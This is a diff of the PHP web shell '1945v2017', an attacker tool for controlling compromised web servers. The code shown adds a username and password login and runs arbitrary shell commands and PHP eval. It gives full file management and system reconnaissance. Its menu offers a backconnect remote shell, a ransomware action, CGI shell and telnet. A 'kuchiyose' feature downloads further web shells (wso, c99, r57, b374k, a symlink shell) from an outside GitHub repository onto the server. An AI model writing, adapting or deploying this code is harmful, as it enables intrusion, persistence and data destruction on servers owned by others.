@@ -4,7 +4,15 @@
 @ author : shutdown57 a.k.a alinko
 @ codename : merdekaAtoeMati
 @ release date : 17 Agustus 2017
-@ contact : indonesoanpeople.shutdown57@gmail.com
+@ contact : indonesianpeople.shutdown57@gmail.com
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+!!!~~~~~~~~~~~~~~~ Reference ~~~~~~~~~~~~~~~~~~~~!!!
+
+~ google.com - pastebin.com - github.com - php.net
+~ sourceforge.net - tutorialspoint.com - adminer.org
+~ indoxploit.or.id - linuxcode.org - devilzc0de.com
+~ madleets.com - linuxsec.org 
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 */
 session_start();
 ob_start();
@@ -26,19 +34,25 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) { // dissallow from this array userAgent
 @define('ver', '2017');
 @define('host',$_SERVER['HTTP_HOST']);
 @define('title','1945v'.ver.'-'.host);
-// md5 hash password 
-$passwd_1945 = "f509e5b1aa24c8222241883261555ed5"; // default password ; merdeka
+
+$usernm_1945 = "1945"; // default username : 1945
+$passwd_1945 = "f509e5b1aa24c8222241883261555ed5"; // default password ; merdeka , change with md5 hash
 $session_name = md5($_SERVER['HTTP_HOST']."_session_1945"); // session name
+
 function login_1945_merdekaataoemati()
 {
-	echo "<form method=\"POST\"><center><input type=\"password\" name=\"passwd_1945\"></center></form>";
+	echo "<div style=\"margin-top:250px;\" align=center><h3>1945v2017 - Login</h3></div>";
+	echo "<form method=\"POST\"><table align=center ><tr><td>";
+	echo "Username :</td><td><input type=\"text\" name=\"usernm_1945\"></td></tr><tr>";
+	echo "<td>Password :</td><td><input type=\"password\" name=\"passwd_1945\"></td></tr><tr><td colspan=2>";
+	echo "<input type=\"submit\" value=\">>\"></td></tr></table></form>";
 exit;
 }
-if(!isset($_SESSION[$session_name])){if(empty($passwd_1945)||(isset($_POST['passwd_1945'])&&(md5($_POST['passwd_1945']))==$passwd_1945)){$_SESSION[$session_name]=true;}else{login_1945_merdekaataoemati();}}
+if(!isset($_SESSION[$session_name])){if(empty($passwd_1945)||(empty($usernm_1945))||(isset($_POST['passwd_1945'])&&(md5($_POST['passwd_1945']))==$passwd_1945)&&(isset($_POST['usernm_1945'])&&($_POST['usernm_1945'])==$usernm_1945)){$_SESSION[$session_name]=true;}else{login_1945_merdekaataoemati();}}
 
 class Html45{public function show($str){return print($str);}public function h1($t){$h= "<h1>";$h.= $t;$h.="</h1>";return $h;
 	}public function th($t){$th="<th>";$th.=$t;$th.="</th>";return $th;}public function tr($t){$tr ="<tr>";$tr.=$t;$tr.="</tr>";return $tr;}public function td($t){$td = "<td>";$td.= $t;$td.="</td>";return $td;}public function html($tytyd){
-		$html ="<!DOCTYPE HTML><html><head>";$html.="<title>".$tytyd."</title>";$html.="<link rel=\"icon\" href=\"http://www.animatedimages.org/data/media/781/animated-indonesia-flag-image-0013.gif\">";$html.="<link href=\"https://fonts.googleapis.com/css?family=Raleway\" rel=\"stylesheet\"> ";$html.="<style>*{font-family:Raleway;}body{font-size:13px;background:#000;color:#fff;}.a_exp{border:1px solid #f00;border-collapse: collapse;width:100%}.a_exp tr:hover{background:#f00;}.a_exp tr:nth-child(even){background:#222}.a_exp tr:nth-child(even):hover{background:#f00} a{text-decoration: none;color:#fff;}.a_exp a{color:#fff;}.a_exp a:hover{text-decoration: underline;}.a_exp th{background:#fff;color:#f00;font-weight:bold}a:hover{border-bottom:1px solid #f00;}.input_m{border:1px solid #f00;color:#fff;width:250px;background:#000}.submit_m{color:#fff;border:1px solid #f00;background:#000}.submit_m:hover{border:1px solid #fff}.input_m:hover,.input_m:focus{border-bottom:1px solid #fff}.txtarea_m{margin-left:30px;border:0;border-left:2px solid #f00;color:#fff;width:98%;height:360px;background:#000}.code{margin-left:40px;border-left:2px solid #fff}.table .kiri{border-right:2px solid #fff;padding-right:30px;}ul{list-style:none;background:#333;width:100%;}ul li{padding:5px;display:inline-block;}.action{margin-left:40px;border-left:2px solid #fff;padding:2px}.table{font-size:13px}.kuchiyose{background:url('https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Flag_map_of_Indonesia.svg/2000px-Flag_map_of_Indonesia.svg.png');background-size:cover;background-attachment:fixed;height:700px;text-shadow:0px 2px 4px #000;}.kuchiyose ul{list-style:none;background:transparent;}</style>";$html.="<meta name=\"author\" content=\"shutdown57 a.k.a alinko\">";$html.="</head><body>";return $html;}public function a($href,$displ,$attr){$a="<a href=\"".$href."\" ".$attr.">";$a.=wordwrap($displ,60,"\n",TRUE);$a.="</a>";return $a;}public function pre($c){$p = "<pre>";$p.= $c;$p.= "</pre>";return $p;}public function form($method,$input){$form = "<form method=\"".$method."\">";$form.= $input;$form.= "</form>";return $form;}public function input($type,$name,$attr,$label){$input = "<label for=\"".$name."\">".$label."</label> : ";$input.= "<input type=\"".$type."\"";$input.= "name=\"".$name."\"";$input.= $attr;$input.= " class=\"input_m\">";return $input;}public function submit($name,$attr){$sbmt = "<input type=\"submit\"";$sbmt.= "name=\"".$name."\"";$sbmt.= $attr;$sbmt.= " class=\"submit_m\">";return $sbmt;}public function textarea($name,$content,$attr){$txt = "<textarea name=\"".$name."\"";$txt.= "class=\"txtarea_m\"";$txt.=$attr;$txt.=">";$txt.= $content;$txt.="</textarea>";return $txt;}public function actdone(){$this->show("<div class=\"alert_m\"><b>has a job well done !</b></div>");$this->show("What do you want to go back? [<a href=\"javascript:history.go(-1);\">Yes</a> | <a href=\"?_index\">No</a>]");}public function actfail(){$this->show("<div class=\"alert_x\"><b>the task could not be finished :( , Something Wrong!</b></div>");$this->show("What do you want to go back? [<a href=\"javascript:history.go(-1);\">Yes</a> | <a href=\"?_index\">No</a>]");}public function ul($l){$li = "<ul>";$li.= $l;$li.= "</ul>";return $li;}public function li($ll){$ul = "<li>";$ul.= $ll;$ul.= "</li>";return $ul;}public function select($name,$opt,$o){$s = "<select name=\"".$name."\" ".$o.">";$s.= $opt;$s.= "</select>";return $s;}public function option($val,$sh){$o="<option value=\"".$val."\">";$o.=$sh;$o.="</option>";return $o;}}
+		$html ="<!DOCTYPE HTML><html><head>";$html.="<title>".$tytyd."</title>";$html.="<link rel=\"icon\" href=\"http://www.animatedimages.org/data/media/781/animated-indonesia-flag-image-0013.gif\">";$html.="<link href=\"https://fonts.googleapis.com/css?family=Raleway\" rel=\"stylesheet\"> ";$html.="<style>*{font-family:Raleway;}body{font-size:13px;background:#000;color:#fff;}.a_exp{border:1px solid #f00;border-collapse: collapse;width:100%}.a_exp tr:hover{background:#f00;}.a_exp tr:nth-child(even){background:#222}.a_exp tr:nth-child(even):hover{background:#f00} a{text-decoration: none;color:#fff;}.a_exp a{color:#fff;}.a_exp a:hover{text-decoration: underline;}.a_exp th{background:#fff;color:#f00;font-weight:bold}a:hover{border-bottom:1px solid #f00;}.input_m{border:1px solid #f00;color:#fff;width:250px;background:#000}.submit_m{color:#fff;border:1px solid #f00;background:#000}.submit_m:hover{border:1px solid #fff}.input_m:hover,.input_m:focus{border-bottom:1px solid #fff}.txtarea_m{margin-left:30px;border:0;border-left:2px solid #f00;color:#fff;width:98%;height:360px;background:#000}.code{margin-left:40px;border-left:2px solid #fff}.table .kiri{border-right:2px solid #fff;padding-right:30px;}ul{list-style:none;background:#333;width:100%;}ul li{padding:5px;display:inline-block;}.action{margin-left:40px;border-left:2px solid #fff;padding:2px}.table{font-size:13px}.kuchiyose{background:url('https://upload.wikimedia.org/wikipedia/commons/thumb/a/a9/Flag_map_of_Indonesia.svg/2000px-Flag_map_of_Indonesia.svg.png');background-size:cover;background-attachment:fixed;height:700px;text-shadow:0px 2px 4px #000;}.kuchiyose ul{list-style:none;background:transparent;}hr{border:1px solid #fff}</style>";$html.="<meta name=\"author\" content=\"shutdown57 a.k.a alinko\">";$html.="</head><body>";return $html;}public function a($href,$displ,$attr){$a="<a href=\"".$href."\" ".$attr.">";$a.=wordwrap($displ,60,"\n",TRUE);$a.="</a>";return $a;}public function pre($c){$p = "<pre>";$p.= $c;$p.= "</pre>";return $p;}public function form($method,$input){$form = "<form method=\"".$method."\">";$form.= $input;$form.= "</form>";return $form;}public function input($type,$name,$attr,$label){$input = "<label for=\"".$name."\">".$label."</label> : ";$input.= "<input type=\"".$type."\"";$input.= "name=\"".$name."\"";$input.= $attr;$input.= " class=\"input_m\">";return $input;}public function submit($name,$attr){$sbmt = "<input type=\"submit\"";$sbmt.= "name=\"".$name."\"";$sbmt.= $attr;$sbmt.= " class=\"submit_m\">";return $sbmt;}public function textarea($name,$content,$attr){$txt = "<textarea name=\"".$name."\"";$txt.= "class=\"txtarea_m\"";$txt.=$attr;$txt.=">";$txt.= $content;$txt.="</textarea>";return $txt;}public function actdone(){$this->show("<div class=\"alert_m\"><b>has a job well done !</b></div>");$this->show("What do you want to go back? [<a href=\"javascript:history.go(-1);\">Yes</a> | <a href=\"?_index\">No</a>]");}public function actfail(){$this->show("<div class=\"alert_x\"><b>the task could not be finished :( , Something Wrong!</b></div>");$this->show("What do you want to go back? [<a href=\"javascript:history.go(-1);\">Yes</a> | <a href=\"?_index\">No</a>]");}public function ul($l){$li = "<ul>";$li.= $l;$li.= "</ul>";return $li;}public function li($ll){$ul = "<li>";$ul.= $ll;$ul.= "</li>";return $ul;}public function select($name,$opt,$o){$s = "<select name=\"".$name."\" ".$o.">";$s.= $opt;$s.= "</select>";return $s;}public function option($val,$sh){$o="<option value=\"".$val."\">";$o.=$sh;$o.="</option>";return $o;}public function footer(){$foot = "<div style=\"margin-top:69px;\" align=\"center\">";$foot.= "copyright &copy; ".date('Y');$foot.= " indonesianpeople | 1945v2017 by :";$foot.= $this->a("https://facebook.com/JKT48.co","shutdown57","target=\"_blank\"");$foot.= "</div>";return $foot;}}
 class FileMan45{public function Spath(){if(isset($_GET['__merdeka__'])){$d = $_GET['__merdeka__'];}else{if(isset($_GET['__files__'])){$d = dirname($_GET['__files__']);}else{if(function_exists('getcwd')){$d = getcwd();}else{$d = __DIR__;}}}return $d;}public function ScanDir($p){
 		if(function_exists('scandir')){$s = scandir($p);}else{echo "<pre>";$s=system('ls -lia');echo "</pre>";}
 		return $s;}public function getfsize($files){$size = filesize($files)/1024;$size = round($size,3);if($size > 1024){$size = round($size/1024,2). 'MB';} else {$size = $size. 'KB';}return $size;}public function getfilemtime($f){$a_fdm=@date("D m Y g:i:s", filemtime($f));return $a_fdm;}public function getmime($f){if(function_exists('mime_content_type')){if(is_readable($f)){$mime = mime_content_type($f);}else{$mime = "Unknown";}}else{if(is_dir($f)){$mime="Directory";}elseif(is_file($f)){$mime="Files";}else{$mime="Unknown";}}return $mime;}public function getowner($path){if(function_exists('posix_getpwuid')) {$downer = @posix_getpwuid(fileowner($path));$downer = $downer['name'];} else {$downer = fileowner($path);}return $downer;}public function getgroup($path){if(function_exists('posix_getgrgid')) {$dgrp = @posix_getgrgid(filegroup($path));$dgrp = $dgrp['name'];} else { $dgrp = filegroup($path);}return $dgrp;} public function getperms($file){$perms = fileperms($file);if (($perms & 0xC000) == 0xC000) {$info = 's';} elseif (($perms & 0xA000) == 0xA000) {$info = 'l';} elseif (($perms & 0x8000) == 0x8000) {$info = '-';} elseif (($perms & 0x6000) == 0x6000) {$info = 'b';} elseif (($perms & 0x4000) == 0x4000) {$info = 'd';} elseif (($perms & 0x2000) == 0x2000) {$info = 'c';} elseif (($perms & 0x1000) == 0x1000) {$info = 'p';} else {$info = 'u';}$info .= (($perms & 0x0100) ? 'r' : '-');$info .= (($perms & 0x0080) ? 'w' : '-');$info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));$info .= (($perms & 0x0020) ? 'r' : '-');$info .= (($perms & 0x0010) ? 'w' : '-');$info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-')); $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-')); return $info;}public function viewfile($f){$file = wordwrap(file_get_contents($f),150,"\n",true);$a= highlight_string($file,true);$old = array("0000BB","000000","FF8000","DD0000", "007700");$new = array("81FF00","e1e1e1", "333333", "ffffff" , "FF8000");$a= str_ireplace($old,$new, $a);$result = "<div class=\"code\">";$result .= $a;$result.="</div>";return $result;}public function currentdir($path,$goto){$dir = str_replace("\\","/",$path);$dir = explode("/",$dir);foreach($dir as $o=>$i){if($i == "" && $o == 0){echo "<a href='?".$goto."=/'>/</a>";continue;}if($i == "")continue;echo "<a href='?".$goto."=";for($p=0;$p<=$o;$p++){ echo $dir[$p]; if($p != $o){echo "/";} } echo "'>".$i."</a>/";}if(is_writable($path)){echo "- [<b><font color=lime>W</font></b>]";}elseif(is_readable($path)){echo "- [<b><font color=red>R</font></b>]";}else{echo "- [<b><font color=grey>Unknown</b>]";}}public function actiondir($p){$h= new Html45();$a =$h->a("?__merdeka__=".$p."&__action__=rename","ren","");$a.=" | ";$a.=$h->a("?__merdeka__=".$p."&__action__=delete","del","");$a.=" | ";$a.=$h->a("?__merdeka__=".$p."&__action__=mkdir","newDir","");$a.=" | ";$a.=$h->a("?__merdeka__=".$p."&__action__=touch","newFile","");return $a;}public function actionfile($p){$h= new Html45();$a =$h->a("?__files__=".$p."&__action__=rename","ren","");$a.=" | ";$a.=$h->a("?__files__=".$p."&__action__=delete","del","");$a.=" | ";$a.=$h->a("?__files__=".$p."&__action__=edit","edit","");$a.=" | ";$a.=$h->a("?__files__=".$p."&__action__=dl","download","");return $a;	}static function cmd($cmd){
@@ -49,56 +63,21 @@ class SysInfo45{public function servis(){$mysql= (function_exists('mysql_connect
 class Act45{public function upload($a,$b){
 		if(function_exists('move_uploaded_file')){$upl = move_uploaded_file($a,$b);}elseif (function_exists('copy')) {$upl = copy($a,$b);}return $upl; }public function simpantext($o,$k){$fp = fopen($o,"w");$o=fwrite($fp,$k);$o.=fclose($fp);return $o; } public function delete($dir){if(is_dir($dir)){if(!rmdir($dir)){$s=scandir($dir);foreach ($s as $ss) {if(is_file($dir."/".$ss)){if(unlink($dir."/".$ss)){$rm=rmdir($dir);}}if(is_dir($dir."/".$ss)){$rm=rmdir($dir."/".$ss);$rm.=rmdir($dir);$rm.=system('rm -rf '.$dir);}}}}elseif(is_file($dir)){$rm = unlink($dir);if(!$rm){system('rm -rf '.$dir);}}return $rm;}public function mkdirr($dir,$nd){if(is_writable($dir)){if(function_exists('mkdir')){$mkdir = mkdir($dir."/".$nd);}else{$mkdir = @system('mkdir '.$dir.'/'.$nd);}}return $mkdir;}public function renamet($old,$new){if(function_exists('rename')){$rename = rename($old,$new);}else{	$rename = @system('mv '.$old.' '.$new.'');}return $rename;}public static function getscript($isi,$url){$fp = fopen($isi,"w");$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_BINARYTRANSFER,1); curl_setopt($ch, CURLOPT_RETURNTRANSFER,1); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER,0); curl_setopt($ch, CURLOPT_FILE, $fp);return curl_exec($ch); curl_close($ch);fclose($fp);ob_flush();flush();}public function getcontent($url){    $curl = curl_init($url);curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);$content = curl_exec($curl);
     		curl_close($curl);return $content;}public function kuchiyose($nama){$source = array(
-			"kuchiyose_wso" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/wso.php","kuchiyose_b374k"=> "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/b374k.php","kuchiyose_idx" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/indoxploit.php","kuchiyose_ayana"=> "https://raw.githubusercontent.com/alintamvanz/webshell/master/ayana.php","kuchiyose_lc" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/linuxcode.php","kuchiyose_wa" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/webadmin.php","kuchiyose_1945" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/1945.php","kuchiyose_r57" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/r57.php","kuchiyose_it" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/itsec.php","kuchiyose_c99" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/c99.php","kuchiyose_ms" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/mini-shell.php"); if(is_writable(getcwd())){if(!file_exists('1945_kcy')){$alert="Creating Directory <b>1945_kcy</b> ..."; sleep(2); if(@mkdir('1945_kcy')){$alert= "<script>alert('Directory Created !');</script><meta http-equiv='refresh' content=0;url=>";}}else{ if(!file_exists('1945_kcy/'.$nama.'.php')){if(Act45::getscript("1945_kcy/".$nama.".php",$source[$nama])){$alert= "<b><font color=lime>kuchiyose No Jutsu !</font></b><br>";$alert.= "File : <a href='1945_kcy/".$nama.".php' target='_blank'>1945_kcy/".$nama.".php</a> <b>Successfully imported</b> ";}else{$alert ="<b><font color=red>kuchiyose No Jutsu !</font></b><br>";$alert.= "File : 1945_kcy/".$nama.".php <b> Can't Proccess !</b>";}}else{ $alert= "<b><font color=green>kuchiyose No Jutsu !</font></b><br>";$alert.= "File : 1945_kcy/".$nama.".php <b>Something problem !</b> ";}}}else{$alert= "Directory : <b><i>".getcwd()."</i></b><font color=red> Not Writable :(<br>";$alert.= "Can't Proccess Request !</font>";$alert.= "<script>alert('Cant Proccess Request ! - Directory not Writable!');</script>";}return $alert;}}
+			"kuchiyose_wso" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/wso.php","kuchiyose_b374k"=> "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/b374k.php","kuchiyose_idx" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/indoxploit.php","kuchiyose_ayana"=> "https://raw.githubusercontent.com/alintamvanz/webshell/master/ayana.php","kuchiyose_lc" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/linuxcode.php","kuchiyose_wa" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/webadmin.php","kuchiyose_1945" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/1945.php","kuchiyose_r57" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/r57.php","kuchiyose_it" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/itsec.php","kuchiyose_c99" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/c99.php","kuchiyose_ms" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/mini-shell.php","kuchiyose_symsa" => "https://raw.githubusercontent.com/alintamvanz/webshell/master/ext/symlinksa.php"); if(is_writable(getcwd())){if(!file_exists('1945_kcy')){$alert="Creating Directory <b>1945_kcy</b> ..."; sleep(2); if(@mkdir('1945_kcy')){$alert= "<script>alert('Directory Created !');</script><meta http-equiv='refresh' content=0;url=>";}}else{ if(!file_exists('1945_kcy/'.$nama.'.php')){if(Act45::getscript("1945_kcy/".$nama.".php",$source[$nama])){$alert= "<b><font color=lime>kuchiyose No Jutsu !</font></b><br>";$alert.= "File : <a href='1945_kcy/".$nama.".php' target='_blank'>1945_kcy/".$nama.".php</a> <b>Successfully imported</b> ";}else{$alert ="<b><font color=red>kuchiyose No Jutsu !</font></b><br>";$alert.= "File : 1945_kcy/".$nama.".php <b> Can't Proccess !</b>";}}else{ $alert= "<b><font color=green>kuchiyose No Jutsu !</font></b><br>";$alert.= "File : 1945_kcy/".$nama.".php <b>Something problem !</b> ";}}}else{$alert= "Directory : <b><i>".getcwd()."</i></b><font color=red> Not Writable :(<br>";$alert.= "Can't Proccess Request !</font>";$alert.= "<script>alert('Cant Proccess Request ! - Directory not Writable!');</script>";}return $alert;}}
 
 
 $html = new Html45();
 $fileman = new FileMan45();
 $sysfo = new SysInfo45();
 $act = new Act45();
-
 $dir = $fileman->Spath();
-
 $scandir = $fileman->ScanDir($dir);
 $no=1;
 $html->show($html->html(title));
-$sysinfomerdekaee ="<pre>"; 
-$sysinfomerdekaee.=$sysfo->uname()."<br>";
-$sysinfomerdekaee.=$sysfo->gethost()."<br>";
-$sysinfomerdekaee.="Server Software : ".$_SERVER['SERVER_SOFTWARE']."<br>";
-$sysinfomerdekaee.="PHP Version :".phpversion()." - [<a href='?__merdeka__=$dir&__action__=infophp'>PHPINFO</a>]<br>";
-$sysinfomerdekaee.=$sysfo->ipsercli()."<br>";
-$sysinfomerdekaee.=$sysfo->hddsize($dir)."<br>";
-$sysinfomerdekaee.=$sysfo->usergroup($dir)."<br>";
-$sysinfomerdekaee.=$sysfo->servis()."<br>";
-$sysinfomerdekaee.="Disable functions :".$sysfo->disablefunc();
-$sysinfomerdekaee.="</pre>";
-$html->show("<table class=\"table\">");
-$html->show($html->tr($html->td("<img src=\"https://alintamvanz.github.io/images/1945/garuda.png\"  style=\"width:150px;height:150px\" class=\"kiri\">").$html->td($sysinfomerdekaee)));
-$html->show("</table>");
+$sysinfomerdekaee ="<pre>"; $sysinfomerdekaee.=$sysfo->uname()."<br>";$sysinfomerdekaee.=$sysfo->gethost()."<br>";$sysinfomerdekaee.="Server Software : ".$_SERVER['SERVER_SOFTWARE']."<br>";$sysinfomerdekaee.="PHP Version :".phpversion()." - [<a href='?__merdeka__=$dir&__action__=infophp'>PHPINFO</a>]<br>";$sysinfomerdekaee.=$sysfo->ipsercli()."<br>";$sysinfomerdekaee.=$sysfo->hddsize($dir)."<br>";$sysinfomerdekaee.=$sysfo->usergroup($dir)."<br>";$sysinfomerdekaee.=$sysfo->servis()."<br>";$sysinfomerdekaee.="Disable functions :".$sysfo->disablefunc();$sysinfomerdekaee.="</pre>";
 
-$html->show("Current Dir :");
-$fileman->currentdir($fileman->Spath(),"__merdeka__");
-$html->show("<hr>");
-$li = $html->li("[ ".$html->a("?_","Home","")." ]");
-$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=sec","Sec. Info","System Security Info")." ]");
-$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=cmd","Command","title=\"Execute command\"")." ]");
-$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=upl","Upload","title=\"Upload file in the server\"")." ]");
-$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=sql","SQL","title=\"Connect to SQL\"")." ]");
-$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=php#code","PHP","title=\"Execute PHP\"")." ]");
-$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=ps","PS","title=\"Display Proccess status\"")." ]");
-$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=str","String Tools","Encode & Decode Tools")." ]");
-$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=net","Network","title=\"Backconnect & Bind Port\"")." ]");
-$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=mail","Mail","title=\"Send email\"")." ]");
-$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=rsw","Ransomeware","title=\"Carefully,with this tools\"")." ]");
-$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=kcy","kuchiyose","title=\"come your favorite tools\"")." ]");
-$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=adm","Admin Finder","title=\"Find admin \"")." ]");
-$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=sh","CGI Shell","title=\"CGI Shell\"")." ]");
-$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=telnet","CGI Telnet","title=\"CGI Telnet\"")." ]");
-$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=abt","About","title=\"About\"")." ]");
-$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=log","Logout","title=\"Logout And Destroy Session\"")." ]");
-$html->show($html->ul($li));
-$html->show("<hr>");
+$html->show("<table class=\"table\">");
+$html->show($html->tr($html->td("<img src=\"https://alintamvanz.github.io/images/1945/garuda.png\"  style=\"width:150px;height:150px\" class=\"kiri\">").$html->td($sysinfomerdekaee)));$html->show("</table>");$html->show("Current Dir :");$fileman->currentdir($fileman->Spath(),"__merdeka__");$html->show("<hr>");$li = $html->li("[ ".$html->a("?_","Home","")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=sec","Sec. Info","System Security Info")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=cmd","Command","title=\"Execute command\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=upl","Upload","title=\"Upload file in the server\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=sql","SQL","title=\"Connect to SQL\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=php#code","PHP","title=\"Execute PHP\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=ps","PS","title=\"Display Proccess status\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=str","String Tools","Encode & Decode Tools")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=net","Remote Shell","title=\"Backconnect & Bind Port\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=mail","Mail","title=\"Send email\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=rsw","Ransomeware","title=\"Carefully,with this tools\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=kcy","kuchiyose","title=\"come your favorite tools\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=adm","Admin Finder","title=\"Find admin \"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=sh","CGI Shell","title=\"CGI Shell\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=telnet","CGI Telnet","title=\"CGI Telnet\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=abt","About","title=\"About\"")." ]");$li .= $html->li("[ ".$html->a("?__merdeka__=$dir&__action__=log","Logout","title=\"Logout And Destroy Session\"")." ]");$html->show($html->ul($li));$html->show("<hr>");
 if(isset($_GET['__action__'])||isset($_GET['__files__']))
 {
 $__files__   = $_GET['__files__'];
@@ -151,11 +130,13 @@ if($__action__ == "view")
 	}
 	$html->show("<b>Files :</b> ".$ren_f."<br>");
 	$html->show("<hr>");
+	$html->show("<center>");
 	$html->show($html->h1("Rename Files / Directory"));
 	$input = "<p>Oldname : <b>".basename($ren_f)."</b></p>"; 
 	$input.= $html->input("text","newname","value=\"usos_1945.php\" ","newName");
 	$input.= $html->submit("renamed","value=\"Save Newname\"");
 	$html->show($html->form("POST",$input));
+	$html->show("</center>");
 	if(isset($_POST['renamed']))
 	{
 		if($act->renamet($ren_f,dirname($ren_f)."/".$_POST['newname']))
@@ -201,14 +182,22 @@ if($__action__ == "view")
 		}
 	}	
 }elseif ($__action__ == "infophp") {
-	phpinfo();
+	@ob_start();
+	@eval("phpinfo();");
+	$buff = @ob_get_contents();
+	@ob_end_clean();	
+	$awal = strpos($buff,"<body>")+6;
+	$akhir = strpos($buff,"</body>");
+	$html->show("<center><div class=\"a_exp\">".substr($buff,$awal,$akhir-$awal)."</div></center>");
 }elseif ($__action__ == "sec") {
 	$sysfo->SecInfo();
 }elseif ($__action__ == "cmd") {
+	$html->show("<center>");
 	$html->show($html->h1("Command : ".$_SERVER['HTTP_HOST']));
 	$html->show("<br>");
 	$input = $html->input("text","cmd","value=\"".$_POST['cmd']."\" style=\"width:600px;\"","1945@".$_SERVER['HTTP_HOST']);
 	$html->show($html->form("POST",$input));
+	$html->show("</center>");
 	if(isset($_POST['cmd']))
 	{
 		$html->show("<hr>");
@@ -293,105 +282,15 @@ foreach($str_a as $str=>$val)
 	$opt.=$html->option($str,$val);
 }
 
-if(isset($_POST['encode']))
-{
+if(isset($_POST['encode'])){
 	$o = $_POST['mode'];
-	switch ($o) {
-		case 'url':
-			$val = urlencode($_POST['str']);
-			break;
-		case 'b64':
-			$val = base64_encode($_POST['str']);
-			break;
-		case 'cuu':
-			$val = convert_uuencode($_POST['str']);
-			break;
-		case 'b64b64':
-			$val = base64_encode(base64_encode($_POST['str']));
-			break;
-		case 'b64str':
-			$val = base64_encode(str_rot13($_POST['str']));
-			break;
-		case 'b64url':
-			$val = base64_encode(urlencode($_POST['str']));
-			break;
-		case 'b64strgz':
-			$val = base64_encode(str_rot13(gzdeflate($_POST['str'])));
-			break;
-		case 'b64cuu':
-			$val = base64_encode(convert_uuencode($_POST['str']));
-			break;
-		default:
-			$val = $_POST['str'];
-			break;
+	switch ($o) {case 'url':$val = urlencode($_POST['str']);break;case 'b64':$val = base64_encode($_POST['str']);break;case 'cuu':$val = convert_uuencode($_POST['str']);break;case 'b64b64':$val = base64_encode(base64_encode($_POST['str']));break;case 'b64str':$val = base64_encode(str_rot13($_POST['str']));break;case 'b64url':$val = base64_encode(urlencode($_POST['str']));break;case 'b64strgz':$val = base64_encode(str_rot13(gzdeflate($_POST['str'])));break;case 'b64cuu':$val = base64_encode(convert_uuencode($_POST['str']));break;default:$val = $_POST['str'];break;
 	}
 }
-if(isset($_POST['decode']))
-{
-	$o = $_POST['mode'];
-	switch ($o) {
-		case 'url':
-			$val = urldecode($_POST['str']);
-			break;
-		case 'b64':
-			$val = base64_decode($_POST['str']);
-			break;
-		case 'cuu':
-			$val = convert_uudecode($_POST['str']);
